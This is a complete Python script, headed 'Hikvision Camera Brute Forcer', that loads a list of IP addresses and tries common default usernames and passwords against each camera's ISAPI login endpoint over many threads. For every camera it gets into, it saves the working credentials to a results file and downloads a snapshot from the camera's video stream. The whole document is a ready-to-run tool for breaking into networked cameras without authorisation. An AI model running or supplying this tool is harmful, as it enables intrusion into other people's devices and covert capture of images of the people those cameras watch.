import requests
from requests.auth import HTTPDigestAuth
import concurrent.futures
import os
from datetime import datetime
import base64

# ASCII Art Logo
LOGO = """
 _   _ _ _    _                     _   _____      _               
| | | (_) | _(_)                   | | |_   _|    (_)              
| |_| | | |/ / | _____ _ __    __ _| |   | | _ __  _  ___ ___ _ __ 
|  _  | |   <| |/ / _ \ '_ \  / _` | |   | || '_ \| |/ __/ _ \ '__|
| | | | | |\  \   <  __/ | | | (_| | |  _| || | | | | (_|  __/ |   
|_| |_|_|_| \_\_|\_\___|_| |_|\__,_|_| |_____|_| |_|_|\___\___|_|  
"""

print(LOGO)
print("Hikvision Camera Brute Forcer")
print("=" * 50 + "\n")

# Configuration
IP_FILE = "ip.txt"  # File with IP addresses, one per line
USERNAMES = ["admin", "Admin", "administrator", "root"]
PASSWORDS = ["12345", "admin", "password", "123456", "1234", "123456789", "12345678", "admin1234"]
THREADS = 20
TIMEOUT = 5
OUTPUT_FILE = "results.txt"
SCREENSHOTS_DIR = "cameras"

def load_ips():
    """Load IP addresses from file"""
    if not os.path.exists(IP_FILE):
        print(f"[!] Error: IP file {IP_FILE} not found!")
        print("[!] Please create ip.txt with one IP per line")
        exit(1)
    
    with open(IP_FILE, "r") as f:
        ips = [line.strip() for line in f if line.strip()]
    
    if not ips:
        print("[!] No IP addresses found in ip.txt")
        exit(1)
    
    return ips

def check_camera(ip, username, password):
    try:
        # Try to access camera web interface
        url = f"http://{ip}/ISAPI/Security/userCheck"
        response = requests.get(url, auth=HTTPDigestAuth(username, password), timeout=TIMEOUT)
        
        if response.status_code == 200:
            print(f"[+] Found credentials: {ip} - {username}:{password}")
            
            # Save to results file
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"{ip}:{username}:{password}\n")
            
            # Try to get a snapshot
            try:
                snapshot_url = f"http://{ip}/ISAPI/Streaming/channels/101/picture"
                snapshot_response = requests.get(
                    snapshot_url, 
                    auth=HTTPDigestAuth(username, password), 
                    timeout=TIMEOUT
                )
                
                if snapshot_response.status_code == 200:
                    filename = f"{SCREENSHOTS_DIR}/{ip.replace('.', '_')}_{username}.jpg"
                    with open(filename, "wb") as img_file:
                        img_file.write(snapshot_response.content)
                    print(f"[+] Saved screenshot for {ip} as {filename}")
            except Exception as e:
                print(f"[-] Could not get screenshot from {ip}: {str(e)}")
            
            return True
    except Exception as e:
        pass
    return False

def brute_force_ip(ip):
    print(f"[*] Checking IP: {ip}")
    for username in USERNAMES:
        for password in PASSWORDS:
            if check_camera(ip, username, password):
                return

def main():
    print("[*] Starting Hikvision camera brute forcer")
    print(f"[*] IP Source: {IP_FILE}")
    print(f"[*] Usernames: {', '.join(USERNAMES)}")
    print(f"[*] Passwords: {', '.join(PASSWORDS)}")
    print(f"[*] Threads: {THREADS}")
    print(f"[*] Results will be saved to {OUTPUT_FILE}")
    print(f"[*] Screenshots will be saved to {SCREENSHOTS_DIR}/")
    print("=" * 50 + "\n")
    
    # Create directories if they don't exist
    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
    
    # Clear previous results
    open(OUTPUT_FILE, "w").close()
    
    # Load IPs from file
    ip_list = load_ips()
    print(f"[*] Loaded {len(ip_list)} IP addresses from {IP_FILE}")
    
    # Start brute forcing with threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(brute_force_ip, ip_list)
    
    print("\n[+] Brute force completed. Check results.txt for credentials.")

if __name__ == "__main__":
    main()